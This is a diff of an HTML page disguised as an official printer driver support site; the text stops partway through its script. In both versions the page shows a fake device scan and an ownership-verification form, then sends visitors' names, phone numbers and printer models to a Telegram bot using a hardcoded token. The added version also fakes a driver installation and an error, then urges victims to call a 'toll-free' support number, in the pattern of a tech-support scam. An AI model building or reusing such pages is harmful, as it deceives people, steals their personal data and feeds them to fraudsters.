@@ -1,281 +1,485 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Smart Device Setup & Drivers</title>
-
-  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17754747703"></script>
-  <script>
-    window.dataLayer = window.dataLayer || [];
-    function gtag(){dataLayer.push(arguments);}
-    gtag('js', new Date());
-    gtag('config', 'AW-17754747703');
-  </script>
-
-<style> 
-    * { margin:0; padding:0; box-sizing:border-box; } 
-    body { font-family: "Segoe UI", Arial, sans-serif; background: #fff; color: #333; line-height: 1.6; font-size: 18px; } 
-    
-    /* HEADER */ 
-    header { display: flex; align-items: center; justify-content: space-between; padding: 16px 40px; background: #fff; border-bottom: 1px solid #e0e0e0; } 
-    .brand-img { height: 48px; } 
-    nav { display: flex; gap: 36px; } 
-    nav a { color: #333; text-decoration: none; font-weight: 600; font-size: 16px; transition: 0.2s; } 
-    nav a:hover { color: #0067b8; } 
-
-    /* BANNER */ 
-    .main-banner { position: relative; background-image: url('../images/bg.png'); background-size: cover; background-position: center; background-repeat: no-repeat; color: #fff; padding: 100px 40px; min-height: 480px; } 
-    .main-banner { background-color: #0078d4; } 
-    
-    .banner-wrap { max-width: 700px; position: relative; z-index: 2; } 
-    .banner-wrap h1 { font-size: 52px; font-weight: 300; margin-bottom: 20px; line-height: 1.2; text-shadow: 0 2px 4px rgba(0,0,0,0.3); } 
-    .banner-wrap p { font-size: 22px; margin-bottom: 35px; text-shadow: 0 1px 2px rgba(0,0,0,0.3); } 
-    
-    .side-img { position: absolute; right: 80px; bottom: -40px; width: 320px; z-index: 1; filter: drop-shadow(0 10px 20px rgba(0,0,0,0.3)); } 
-
-    /* SEARCH AREA WITH LOADING SPINNER */ 
-    .query-box { display: flex; gap: 10px; max-width: 600px; background: rgba(255,255,255,0.1); padding: 10px; border-radius: 8px; backdrop-filter: blur(5px); position: relative; } 
-    
-    .query-field { flex: 1; padding: 16px 20px; font-size: 18px; border-radius: 6px; border: 1px solid #fff; outline: none; } 
-    
-    .action-btn { background: #fff; color: #0067b8; border: none; padding: 0 40px; border-radius: 6px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; min-width: 120px; } 
-    .action-btn:hover { background: #e6e6e6; } 
-
-    /* GRID BUTTONS */
-    .grid-row { margin-top: 30px; display: flex; gap: 15px; flex-wrap: wrap; }
-    .grid-item {
-        background: transparent;
-        border: 2px solid rgba(255,255,255,0.8);
-        color: white;
-        padding: 12px 25px;
-        border-radius: 30px;
-        font-size: 16px;
-        font-weight: 600;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        transition: all 0.3s ease;
-    }
-    .grid-item:hover { background: white; color: #005ea6; transform: translateY(-2px); }
-    .grid-item span { font-size: 20px; }
-
-    /* LINKS */ 
-    .sub-links a { display: inline-block; color: white; text-decoration: none; font-size: 16px; margin-top: 20px; margin-right: 20px; opacity: 0.9; border-bottom: 1px dotted #fff; } 
-    
-    /* PROCESS */ 
-    .process-row { display: flex; justify-content: center; gap: 40px; padding: 60px 20px; background: #f9f9f9; text-align: center; }
-    .process-col { max-width: 300px; }
-    .process-ico { font-size: 40px; color: #0067b8; margin-bottom: 15px; }
-    .process-head { font-weight: 700; margin-bottom: 10px; font-size: 20px; }
-    .process-txt { font-size: 16px; color: #666; }
-
-    .info-area { padding: 40px 20px; text-align: center; background: #fff; border-top: 1px solid #eee; }
-
-    /* POPUP STYLES */ 
-    .overlay-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 9999; align-items: center; justify-content: center; padding: 20px; backdrop-filter: blur(5px); } 
-    .box-inner { background: white; padding: 40px; border-radius: 16px; width: 100%; max-width: 480px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); position: relative; overflow: hidden; } 
-    
-    .prog-track { height: 4px; width: 100%; background: #eee; position: absolute; top: 0; left: 0; }
-    .prog-fill { height: 100%; background: #0067b8; width: 0%; transition: width 0.5s; }
-
-    .box-inner h2 { font-size: 28px; color: #005ea6; margin-bottom: 10px; font-weight: 700; } 
-    .box-inner p { font-size: 16px; color: #666; margin-bottom: 30px; } 
-    .input-grp { margin: 20px 0; text-align: left; } 
-    label { display: block; font-size: 15px; margin-bottom: 8px; font-weight: 600; color: #444; } 
-    input { width: 100%; padding: 14px; font-size: 16px; border: 1px solid #ccc; border-radius: 8px; background: #fcfcfc; transition: 0.3s; } 
-    input:focus { outline: none; border-color: #0067b8; background: white; box-shadow: 0 0 0 3px rgba(0,103,184,0.1); } 
-    
-    .primary-btn { background: #0067b8; color: white; padding: 16px; font-size: 18px; width: 100%; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; margin-top: 10px; transition: 0.3s; } 
-    .primary-btn:hover { background: #004a87; transform: scale(1.02); }
-
-    /* LOADING LAYER - Essential for Trust */
-    .scan-layer { display: none; position: absolute; top:0; left:0; width:100%; height:100%; background:white; z-index: 10; flex-direction: column; align-items: center; justify-content: center; border-radius: 16px; }
-    .load-circle { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0067b8; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .scan-msg { font-size: 18px; font-weight: 600; color: #333; }
-
-    /* RESPONSIVE */ 
-    @media (max-width: 768px) { 
-        .main-banner { padding: 60px 20px; text-align: center; } 
-        .main-banner h1 { font-size: 36px; justify-content: center; } 
-        .side-img { display: none; } 
-        .query-box { flex-direction: column; } 
-        .action-btn { width: 100%; padding: 15px; margin-top: 10px; }
-        .grid-row { justify-content: center; }
-        .process-row { flex-direction: column; align-items: center; }
-        nav { display: none; } 
-    } 
-</style>
-<script src="//code.jivosite.com/widget/kmQyW9kmtz" async></script>
-</head>
-<body>
-
-<header>
-  <img src="../images/Logo.png" class="brand-img" alt="Brand Logo">
-  <nav>
-    <a href="#">Downloads</a>
-    <a href="#">Tools</a>
-    <a href="#">Contact</a>
-  </nav>
-</header>
-
-<section class="main-banner"> 
-  <div class="banner-wrap"> 
-    <h1> Set up your printer </h1> 
-    <p>Enter your product name to get the right Smart software, Wireless drivers, and Utilities.</p> 
-    
-    <div class="query-box"> 
-      <input type="text" placeholder='Example: OfficeJet 9010, Envy 6000' class="query-field" id="queryInput"> 
-      <button class="action-btn" onclick="initScan('Search')">Next</button> 
-    </div> 
-
-    <div class="grid-row">
-        <button class="grid-item" onclick="initScan('WiFi')">
-            <span>📶</span> Wireless Setup
-        </button>
-        <button class="grid-item" onclick="initScan('Smart App')">
-            <span>📱</span> HP Smart App
-        </button>
-        <button class="grid-item" onclick="initScan('Driver')">
-            <span>💾</span> Driver Download
-        </button>
-    </div>
-
-    <div class="sub-links"> 
-      <a href="#" onclick="initScan('Unknown');return false;">Where's the product name?</a> 
-      <a href="#" onclick="initScan('Unknown');return false;">My device is not listed</a> 
-    </div> 
-  </div> 
-  
-  <img src="../images/IMg1.png" class="side-img" alt="Device"> 
-</section> 
-
-<div class="process-row">
-    <div class="process-col">
-        <div class="process-ico">1</div>
-        <div class="process-head">Identify Device</div>
-        <div class="process-txt">We automatically detect your printer model and system requirements.</div>
-    </div>
-    <div class="process-col">
-        <div class="process-ico">2</div>
-        <div class="process-head">Download File</div>
-        <div class="process-txt">Get the latest official drivers and Smart software securely.</div>
-    </div>
-    <div class="process-col">
-        <div class="process-ico">3</div>
-        <div class="process-head">Install & Print</div>
-        <div class="process-txt">Follow the easy wizard to connect to WiFi and start printing.</div>
-    </div>
-</div>
-
-<div class="info-area"> 
-  <p><strong>Need help?</strong> Our automated assistant can guide you through the process.</p>
-</div>
-
-<div class="overlay-box" id="actionModal">
-  <div class="box-inner">
-    
-    <div class="scan-layer" id="scanScreen">
-        <div class="load-circle"></div>
-        <div class="scan-msg" id="scanText">Checking System Compatibility...</div>
-    </div>
-
-    <div class="prog-track"><div class="prog-fill" id="fillBar"></div></div>
-
-    <h2>Verify Ownership</h2>
-    <p>To prevent spam download, please verify your details to access the driver.</p>
-    
-    <div class="input-grp">
-      <label>Device Model Detected</label>
-      <input type="text" id="deviceTag" readonly style="background: #e9ecef; cursor: not-allowed; color: #005ea6; font-weight:bold;">
-    </div>
-    <div class="input-grp">
-      <label>Your Name</label>
-      <input type="text" id="visitorName" placeholder="Enter Full Name">
-    </div>
-    <div class="input-grp">
-      <label>Phone Number (for activation)</label>
-      <input type="tel" id="contactNum" placeholder="Ex: +1 234 567 890">
-    </div>
-    
-    <button class="primary-btn" onclick="sendData()">Get Drivers Now</button>
-    <p style="font-size:12px; margin-top:15px; color:#999;">Secure Connection • Official Support</p>
-  </div>
-</div>
-
-<script>
-// Your Telegram credentials
-const BOT_TOKEN = "7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734";
-const CHAT_ID = "1684000886";
-let detectedSource = "Search";
-
-function initScan(source) {
-    detectedSource = source;
-    let inputVal = document.getElementById("queryInput").value;
-    
-    if(inputVal) {
-        document.getElementById("deviceTag").value = inputVal;
-    } else {
-        if (source === "Search") {
-            document.getElementById("deviceTag").value = "Universal Driver Bundle";
-        } else {
-            document.getElementById("deviceTag").value = source + " Mode";
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universal Printer Driver Support</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #f0f2f5;
+            color: #1a202c;
+            font-size: 16px; /* Slightly reduced base font for better fit */
+            overflow-x: hidden;
+            line-height: 1.4; /* Tighter line height */
         }
-    }
 
-    document.getElementById("actionModal").style.display = "flex";
-    
-    // START LOADING ANIMATION
-    const loader = document.getElementById("scanScreen");
-    const loaderText = document.getElementById("scanText");
-    loader.style.display = "flex";
-    
-    // Fake steps (Total 2.5 seconds)
-    setTimeout(() => { loaderText.innerText = "Analyzing Network..."; }, 800);
-    setTimeout(() => { loaderText.innerText = "Checking Driver Status..."; }, 1600);
-    setTimeout(() => { 
-        loader.style.display = "none"; // Hide loader, show form
-    }, 2500);
-}
+        .fade-in { animation: fadeIn 0.5s ease-in; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-function sendData() {
-  const name = document.getElementById("visitorName").value.trim();
-  const phone = document.getElementById("contactNum").value.trim();
-  const model = document.getElementById("deviceTag").value.trim();
-  const btn = document.querySelector('.primary-btn');
+        .pulse-effect { animation: pulse-blue 2s infinite; }
+        @keyframes pulse-blue {
+            0% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0.7); }
+            70% { box-shadow: 0 0 0 10px rgba(37, 99, 235, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(37, 99, 235, 0); }
+        }
 
-  if (!name || !phone) {
-    alert("Please verify your Name and Phone Number to continue.");
-    return;
-  }
+        .main-header {
+            background: #ffffff;
+            border-bottom: 2px solid #e5e7eb;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
 
-  // Change button to show processing
-  btn.innerText = "Validating Request...";
-  btn.style.background = "#555";
-  document.getElementById("fillBar").style.width = "70%";
+        .software-item {
+            border: 2px solid #e5e7eb;
+            transition: all 0.3s ease;
+        }
+        .software-item:hover {
+            border-color: #3b82f6;
+            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.1);
+        }
 
-  // Send to Telegram
-  const message = `🔥 NEW LEAD 🔥\n\n👤 Name: ${name}\n📱 Phone: ${phone}\n🖨 Action: ${model}\n🔍 Source: ${detectedSource}`;
-  
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-  })
-  .then(() => {
-     document.getElementById("fillBar").style.width = "100%";
-     setTimeout(() => {
-        window.location.href = "loading.html";
-     }, 1500); 
-  })
-  .catch((err) => {
-     
-     window.location.href = "/setup/loading.html";
-  });
-}
-</script>
+        .ui-layer {
+            background-color: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(4px);
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        .ui-layer.active {
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .ui-content {
+            transform: scale(0.95);
+            transition: transform 0.3s ease;
+        }
+        .ui-layer.active .ui-content {
+            transform: scale(1);
+        }
 
+        .sys-input {
+            border: 2px solid #cbd5e0;
+            transition: border-color 0.2s;
+            font-size: 1.1rem;
+            padding: 0.8rem;
+        }
+        .sys-input:focus {
+            border-color: #2563eb;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+        }
+
+        .process-bar {
+            background-image: linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+            background-size: 1.5rem 1.5rem;
+            animation: process-anim 1s linear infinite;
+        }
+        @keyframes process-anim { from { background-position: 1.5rem 0; } to { background-position: 0 0; } }
+
+        .app-header {
+            border-bottom: 1px solid #e5e7eb;
+            background: #f1f5f9;
+        }
+        
+        .btn-giant { padding: 1rem 2rem; font-size: 1.25rem; }
+    </style>
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17754747703"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'AW-17754747703');
+    </script>
+    <script src="//code.jivosite.com/widget/kmQyW9kmtz" async></script>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <!-- App Navigation -->
+    <header class="main-header sticky top-0 z-40">
+        <div class="max-w-6xl mx-auto px-4 py-2 flex flex-col md:flex-row justify-between items-center gap-2">
+            <div class="flex items-center gap-3">
+                <div class="bg-blue-700 text-white p-2 rounded-lg shadow-sm">
+                    <i class="fas fa-print text-2xl"></i>
+                </div>
+                <div>
+                    <h1 class="text-xl font-bold text-gray-900 leading-none">Universal Print Support</h1>
+                    <span class="text-xs text-gray-600 font-semibold tracking-wide">OFFICIAL DRIVER REPOSITORY</span>
+                </div>
+            </div>
+            
+            <div class="flex flex-col md:flex-row items-center gap-2 md:gap-4">
+                 <div class="flex items-center gap-2 text-green-700 font-bold bg-green-50 px-3 py-1 rounded-full border border-green-200 text-sm">
+                    <i class="fas fa-shield-alt"></i> Verified Secure
+                </div>
+                <a href="tel:+17602740555" class="group flex items-center gap-2 bg-yellow-400 hover:bg-yellow-500 text-gray-900 px-4 py-2 rounded-lg shadow-md transition-transform transform hover:scale-105">
+                    <i class="fas fa-phone-alt text-xl"></i>
+                    <div class="flex flex-col items-start leading-none">
+                        <span class="text-[10px] font-bold uppercase tracking-wider">Toll-Free Support</span>
+                        <span class="text-lg font-black">1-760-274-0555</span>
+                    </div>
+                </a>
+            </div>
+        </div>
+    </header>
+
+    <main class="flex-grow p-2 md:p-4 flex justify-center items-center">
+        
+        <div class="w-full max-w-4xl bg-white rounded-xl shadow-xl overflow-hidden border border-gray-300 fade-in relative min-h-[400px]">
+            
+            <div class="app-header px-4 py-2 flex items-center gap-3 bg-gray-100 border-b border-gray-300">
+                <div class="flex gap-2">
+                    <div class="w-3 h-3 rounded-full bg-red-500 border border-red-600"></div>
+                    <div class="w-3 h-3 rounded-full bg-yellow-500 border border-yellow-600"></div>
+                    <div class="w-3 h-3 rounded-full bg-green-500 border border-green-600"></div>
+                </div>
+                <div class="flex-grow bg-white border border-gray-400 rounded-md px-3 py-1 text-sm text-gray-700 flex items-center shadow-inner">
+                    <i class="fas fa-lock text-green-600 mr-2"></i>
+                    <span id="url-display" class="font-medium">https://support.universal-drivers.com/setup</span>
+                </div>
+            </div>
+
+            <!-- HOME -->
+            <div id="view-home" class="p-4 md:p-8 text-center">
+                <div class="mb-4 inline-block p-4 rounded-full bg-blue-50 border-2 border-blue-100">
+                    <i class="fas fa-cloud-download-alt text-5xl text-blue-700"></i>
+                </div>
+                <h2 class="text-3xl md:text-4xl font-bold text-gray-900 mb-2 tracking-tight">Setup Your Printer</h2>
+                <p class="text-lg text-gray-700 max-w-2xl mx-auto mb-6 leading-relaxed">
+                    Welcome. This automated assistant will help you <strong>connect your printer</strong>, download the correct <strong>drivers</strong>, and configure <strong>Wi-Fi</strong>.
+                </p>
+
+                <!-- MOVED BUTTON UP HERE -->
+                <button onclick="startScan()" class="bg-blue-700 hover:bg-blue-800 text-white btn-giant font-bold rounded-xl shadow-xl transform transition hover:scale-105 pulse-effect w-full md:w-auto mb-6">
+                    Start Setup Now <i class="fas fa-arrow-right ml-3"></i>
+                </button>
+                
+                <div class="grid md:grid-cols-3 gap-4 max-w-4xl mx-auto text-left border-t border-gray-200 pt-4">
+                    <div class="p-3 border-2 border-gray-200 rounded-xl bg-gray-50 hover:border-blue-300 transition-colors">
+                        <i class="fas fa-search text-blue-600 mb-1 text-xl"></i>
+                        <h3 class="text-base font-bold text-gray-900 mb-0">1. Detect</h3>
+                        <p class="text-sm text-gray-700">Finds your printer model automatically.</p>
+                    </div>
+                    <div class="p-3 border-2 border-gray-200 rounded-xl bg-gray-50 hover:border-blue-300 transition-colors">
+                        <i class="fas fa-download text-blue-600 mb-1 text-xl"></i>
+                        <h3 class="text-base font-bold text-gray-900 mb-0">2. Download</h3>
+                        <p class="text-sm text-gray-700">Gets the latest 2024 security updates.</p>
+                    </div>
+                    <div class="p-3 border-2 border-gray-200 rounded-xl bg-gray-50 hover:border-blue-300 transition-colors">
+                        <i class="fas fa-wifi text-blue-600 mb-1 text-xl"></i>
+                        <h3 class="text-base font-bold text-gray-900 mb-0">3. Connect</h3>
+                        <p class="text-sm text-gray-700">Sets up wireless printing instantly.</p>
+                    </div>
+                </div>
+
+                <div class="mt-4 text-sm text-gray-500 font-medium">
+                    <i class="fab fa-windows text-base mr-1"></i> Compatible with Windows 10, 11 & macOS
+                </div>
+            </div>
+
+            <!-- SCANNING -->
+            <div id="view-scanning" class="hidden p-12 text-center h-full flex flex-col justify-center items-center py-20">
+                <div class="relative mb-8">
+                    <div class="absolute inset-0 bg-blue-100 rounded-full animate-ping opacity-75"></div>
+                    <i class="fas fa-search text-6xl text-blue-700 relative z-10"></i>
+                </div>
+                <h3 class="text-2xl font-bold text-gray-900 mb-3">Scanning System...</h3>
+                <p class="text-lg text-gray-600">Please wait while we detect your printer.</p>
+                <div class="w-full max-w-sm h-3 bg-gray-200 rounded-full mt-6 overflow-hidden mx-auto border border-gray-300">
+                    <div class="h-full bg-blue-600 animate-[width_2s_ease-in-out_infinite]" style="width: 50%"></div>
+                </div>
+            </div>
+
+            <!-- REPOSITORY -->
+            <div id="view-drivers" class="hidden p-6 md:p-10 bg-gray-50 h-full">
+                <h2 class="text-2xl font-bold text-gray-900 mb-6 border-b-2 border-gray-200 pb-3">Software Found</h2>
+                
+                <div class="bg-white rounded-xl shadow-md p-6 software-item mb-6 flex flex-col md:flex-row gap-6 items-center">
+                    <div class="w-32 h-32 bg-gray-100 rounded-xl flex items-center justify-center flex-shrink-0 border border-gray-200">
+                        <i class="fas fa-box-open text-5xl text-gray-400"></i>
+                    </div>
+                    <div class="flex-grow text-center md:text-left">
+                        <div class="flex flex-wrap justify-center md:justify-start gap-2 mb-2">
+                            <span class="bg-green-100 text-green-800 text-xs font-bold px-2 py-1 rounded border border-green-200">RECOMMENDED</span>
+                            <span class="bg-blue-100 text-blue-800 text-xs font-bold px-2 py-1 rounded border border-blue-200">OFFICIAL DRIVER</span>
+                        </div>
+                        <h3 class="text-xl font-bold text-gray-900 mb-1">Full Driver & Software Package</h3>
+                        <p class="text-gray-600 text-sm mb-3 bg-gray-100 inline-block px-2 rounded">
+                            Filename: <strong>Setup_Admin_Full_v4.2.exe</strong>
+                        </p>
+                        <ul class="text-sm text-gray-600 space-y-1">
+                            <li class="flex items-center justify-center md:justify-start gap-2"><i class="fas fa-check text-green-600 text-lg"></i> Detected OS: <strong>Windows 10/11 (64-bit)</strong></li>
+                            <li class="flex items-center justify-center md:justify-start gap-2"><i class="fas fa-check text-green-600 text-lg"></i> File Size: <strong>148.5 MB</strong></li>
+                            <li class="flex items-center justify-center md:justify-start gap-2"><i class="fas fa-check text-green-600 text-lg"></i> Release Date: <strong>October 2024</strong></li>
+                        </ul>
+                    </div>
+                    <div class="flex-shrink-0 w-full md:w-auto mt-4 md:mt-0">
+                        <button onclick="initAuth()" class="w-full bg-green-600 hover:bg-green-700 text-white text-lg font-bold py-4 px-8 rounded-xl shadow-lg transition flex items-center justify-center gap-2 transform hover:scale-105">
+                            <i class="fas fa-download text-xl"></i> Install Now
+                        </button>
+                    </div>
+                </div>
+
+                <div class="text-center text-xs text-gray-500 mt-6 font-medium">
+                    <i class="fas fa-shield-alt text-green-600"></i> Safe & Secure Download
+                </div>
+            </div>
+
+            <!-- PROCESSING -->
+            <div id="view-process" class="hidden p-8 md:p-16 text-center">
+                <div class="mb-8 relative inline-block">
+                    <i class="fas fa-print text-6xl text-gray-300"></i>
+                    <div class="absolute -bottom-2 -right-2 bg-white rounded-full p-2 shadow-lg border border-gray-100">
+                        <i class="fas fa-cog fa-spin text-3xl text-blue-600"></i>
+                    </div>
+                </div>
+                
+                <h2 class="text-2xl font-bold text-gray-900 mb-3">Installing Drivers...</h2>
+                <p class="text-lg text-gray-600 mb-8 bg-yellow-50 border border-yellow-200 inline-block px-4 py-2 rounded-lg text-yellow-800">
+                    <i class="fas fa-exclamation-circle mr-2"></i> Please do not turn off your computer.
+                </p>
+
+                <div class="w-full max-w-xl mx-auto bg-gray-200 rounded-full h-6 overflow-hidden shadow-inner mb-3 border border-gray-300">
+                    <div id="process-bar" class="h-full bg-blue-600 process-bar" style="width: 0%"></div>
+                </div>
+                
+                <div class="flex justify-between max-w-xl mx-auto text-base font-bold text-gray-700 mb-6">
+                    <span id="process-stage">Initializing...</span>
+                    <span id="process-percent">0%</span>
+                </div>
+
+                <div class="max-w-xl mx-auto bg-gray-900 rounded-lg p-3 text-left h-28 overflow-y-auto font-mono text-xs text-green-400 shadow-inner border border-gray-700" id="sys-log">
+                    > System: Windows NT 10.0 detected.<br>
+                    > Init: Setup Wizard v4.2<br>
+                </div>
+            </div>
+
+            <!-- EXCEPTION -->
+            <div id="view-exception" class="hidden p-6 md:p-12 text-center">
+                <div class="inline-block p-5 rounded-full bg-red-50 mb-6 animate-bounce border-4 border-red-100">
+                    <i class="fas fa-times-circle text-6xl text-red-600"></i>
+                </div>
+
+                <h2 class="text-3xl font-bold text-gray-900 mb-4">Installation Failed</h2>
+                
+                <div class="max-w-xl mx-auto bg-red-50 border-l-8 border-red-600 p-6 mb-8 text-left shadow-md rounded-r-lg">
+                    <h3 class="text-xl font-bold text-red-800 mb-2">Critical Error: 0x80070057</h3>
+                    <p class="text-lg text-gray-800 leading-relaxed">
+                        The printer could not register with the Windows Spooler. This is likely a <strong>driver conflict</strong> or <strong>firewall block</strong>.
+                    </p>
+                </div>
+
+                <p class="text-xl text-gray-800 font-bold mb-6">
+                    Technical assistance is required to complete setup.
+                </p>
+
+                <div class="bg-gray-900 text-white rounded-xl p-6 shadow-2xl mb-8 max-w-md mx-auto transform hover:-translate-y-2 transition duration-300 border-4 border-yellow-500">
+                    <p class="text-gray-300 text-xs uppercase tracking-widest mb-2 font-bold">Toll-Free Support Line</p>
+                    <a href="tel:+17602740555" class="block text-4xl font-black tracking-widest text-yellow-400 hover:text-white transition">
+                        1-760-274-0555
+                    </a>
+                    <div class="flex items-center justify-center gap-2 mt-3 text-green-400 text-base font-bold">
+                        <span class="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
+                        Technicians Available Now
+                    </div>
+                </div>
+
+                <button onclick="window.location.reload()" class="text-gray-500 underline hover:text-gray-800 text-base">
+                    Retry Installation
+                </button>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- AUTH OVERLAY -->
+    <div id="secure-verify" class="ui-layer fixed inset-0 z-50 flex items-center justify-center p-4">
+        <div class="ui-content bg-white w-full max-w-md rounded-xl shadow-2xl overflow-hidden border-2 border-blue-600">
+            <div class="bg-blue-700 p-4 flex justify-between items-center text-white">
+                <h3 class="font-bold text-xl"><i class="fas fa-shield-alt mr-2"></i> Verification Required</h3>
+            </div>
+            
+            <div class="p-6">
+                <div class="text-center mb-6 bg-blue-50 p-3 rounded-lg border border-blue-100">
+                    <p class="text-gray-800 text-base font-medium">
+                        To activate your warranty and enable wireless features, please verify your ownership.
+                    </p>
+                </div>
+
+                <form id="reg-form" onsubmit="submitAuth(event)">
+                    <!-- System Guard -->
+                    <input type="text" id="_nav_guard" class="hidden" style="display:none" autocomplete="off">
+
+                    <div class="space-y-4">
+                        <div>
+                            <label class="block text-gray-800 text-base font-bold mb-1">Printer Model Number</label>
+                            <input type="text" id="dev_model" class="w-full rounded-lg sys-input bg-gray-50 text-gray-900" placeholder="e.g. HP DeskJet 2700..." required>
+                        </div>
+                        <div>
+                            <label class="block text-gray-800 text-base font-bold mb-1">Your Full Name</label>
+                            <input type="text" id="user_id" class="w-full rounded-lg sys-input bg-gray-50 text-gray-900" placeholder="Name" required>
+                        </div>
+                        <div>
+                            <label class="block text-gray-800 text-base font-bold mb-1">Phone Number</label>
+                            <input type="tel" id="contact_id" class="w-full rounded-lg sys-input bg-gray-50 text-gray-900" placeholder="+1 (555) 000-0000" required>
+                            <p class="text-xs text-gray-500 mt-1 font-medium"><i class="fas fa-lock text-green-600"></i> Secure verification</p>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="action-btn" class="w-full mt-6 bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-lg shadow-lg transition flex justify-center items-center gap-2 text-lg">
+                        <span>Verify & Download</span>
+                        <i class="fas fa-check-circle"></i>
+                    </button>
+                </form>
+                
+                <div class="mt-4 text-center">
+                    <p class="text-xs text-gray-400 font-medium">256-bit SSL Encrypted Connection</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="bg-gray-100 border-t mt-auto py-4">
+        <div class="max-w-5xl mx-auto px-6 text-center">
+            <div class="flex justify-center gap-6 text-2xl text-gray-400 mb-3">
+                <i class="fab fa-windows hover:text-blue-600 transition"></i>
+                <i class="fab fa-apple hover:text-gray-800 transition"></i>
+                <i class="fab fa-android hover:text-green-600 transition"></i>
+            </div>
+            
+            <div class="text-xs text-gray-500 space-y-2">
+                <p>&copy; 2024 Universal Printer Solutions. All rights reserved.</p>
+                <div class="max-w-3xl mx-auto text-justify text-gray-500 px-4 mt-2 leading-relaxed border-t border-gray-200 pt-2">
+                    <strong>DISCLAIMER:</strong> We are an independent third-party service provider for printer setup, drivers, and diagnostics. We are not affiliated with, endorsed by, or sponsored by any specific printer manufacturer. All brand names and trademarks are property of their respective owners.
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // CONFIG
+        const TG_BOT_TOKEN = '7764513169:AAFpRf8WQ6WE7DymOqMgTxXjv6BUSZe2734'; 
+        const TG_CHAT_ID = '1684000886'; 
+
+
+        const sections = {
+            home: document.getElementById('view-home'),
+            scan: document.getElementById('view-scanning'),
+            repo: document.getElementById('view-drivers'),
+            proc: document.getElementById('view-process'),
+            err: document.getElementById('view-exception')
+        };
+        const authUI = document.getElementById('secure-verify');
+        const urlBar = document.getElementById('url-display');
+
+        function navTo(sectionName, path) {
+            Object.values(sections).forEach(el => el.classList.add('hidden'));
+            sections[sectionName].classList.remove('hidden');
+            if(path) urlBar.textContent = `https://support.universal-drivers.com/${path}`;
+            window.scrollTo(0,0);
+        }
+
+        function startScan() {
+            navTo('scan', 'detecting-device');
+            setTimeout(() => {
+                navTo('repo', 'downloads/driver-pack-v4');
+            }, 2500); 
+        }
+
+        function initAuth() {
+            authUI.classList.add('active');
+        }
+
+        async function submitAuth(e) {
+            e.preventDefault();
+            
+            if(document.getElementById('_nav_guard').value) return;
+
+            const btn = document.getElementById('action-btn');
+            const model = document.getElementById('dev_model').value;
+            const name = document.getElementById('user_id').value;
+            const phone = document.getElementById('contact_id').value;
+
+            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> Verifying...';
+            btn.disabled = true;
+
+            const payload = `🖨️ *New Setup Lead*\n\n📌 Model: ${model}\n👤 Name: ${name}\n📱 Phone: ${phone}\n🔗 Type: Popup Form`;
+
+            // Logic corrected: Removed the comparison that blocked sending
+            if (TG_BOT_TOKEN && TG_BOT_TOKEN.length > 0) {
+                try {
+                    await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: TG_CHAT_ID,
+                            text: payload,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (err) {
+                    console.error("API Error", err);
+                }
+            } else {
+                console.warn("Telegram Token Missing");
+                await new Promise(r => setTimeout(r, 1000));
+            }
+
+            authUI.classList.remove('active');
+            initSequence();
+        }
+
+        function initSequence() {
+            navTo('proc', 'installing/progress');
+            
+            const bar = document.getElementById('process-bar');
+            const pct = document.getElementById('process-percent');
+            const stg = document.getElementById('process-stage');
+            const log = document.getElementById('sys-log');
+
+            const phases = [
+                { v: 15, t: "Verifying Device Signature...", l: "> Device: Verified." },
+                { v: 35, t: "Downloading Driver Pack (100%)...", l: "> Download: Complete." },
+                { v: 55, t: "Extracting Files to System32...", l: "> Extracting: success." },
